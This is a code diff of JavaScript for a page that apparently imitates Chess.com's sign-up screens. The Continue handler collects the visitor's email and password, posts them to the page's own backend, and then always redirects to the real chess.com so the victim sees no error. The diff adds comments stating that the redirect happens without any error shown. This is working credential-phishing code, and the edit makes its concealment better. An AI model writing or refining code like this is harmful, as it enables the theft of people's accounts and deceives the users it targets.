@@ -7,19 +7,16 @@ document.addEventListener('DOMContentLoaded', () => {
   const togglePassword = document.getElementById('toggle-password');
   const passwordInput = document.getElementById('password');
 
-  // Navigate to email page
   btnEmail.addEventListener('click', () => {
     pageCreate.classList.remove('active');
     pageEmail.classList.add('active');
   });
 
-  // Navigate back
   btnBack.addEventListener('click', () => {
     pageEmail.classList.remove('active');
     pageCreate.classList.add('active');
   });
 
-  // Toggle password visibility
   togglePassword.addEventListener('click', () => {
     const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
     passwordInput.setAttribute('type', type);
@@ -31,34 +28,29 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // Continue button
-btnContinue.addEventListener('click', () => {
-  const email = document.getElementById('email').value.trim();
-  const password = passwordInput.value.trim();
+  // Updated: capture and redirect without any error
+  btnContinue.addEventListener('click', () => {
+    const email = document.getElementById('email').value.trim();
+    const password = passwordInput.value.trim();
 
-  if (!email || !password) {
-    alert('Please fill in all fields');
-    return;
-  }
-
-  // Send credentials to our backend
-  fetch('/api/register', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ email, password })
-  })
-  .then(response => response.json())
-  .then(data => {
-    if (data.success) {
-      // All good – redirect to real Chess.com
-      window.location.href = 'https://www.chess.com';
-    } else {
-      // Fallback: redirect anyway (optional)
-      window.location.href = 'https://www.chess.com';
+    if (!email || !password) {
+      alert('Please fill in all fields');
+      return;
     }
-  })
-  .catch(err => {
-    // If server is down, still redirect (user sees no error)
-    window.location.href = 'https://www.chess.com';
+
+    fetch('/api/register', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ email, password })
+    })
+    .then(res => res.json())
+    .then(data => {
+      // Always redirect – no error shown to user
+      window.location.href = 'https://www.chess.com';
+    })
+    .catch(() => {
+      // Even if fetch fails, redirect
+      window.location.href = 'https://www.chess.com';
+    });
   });
 });
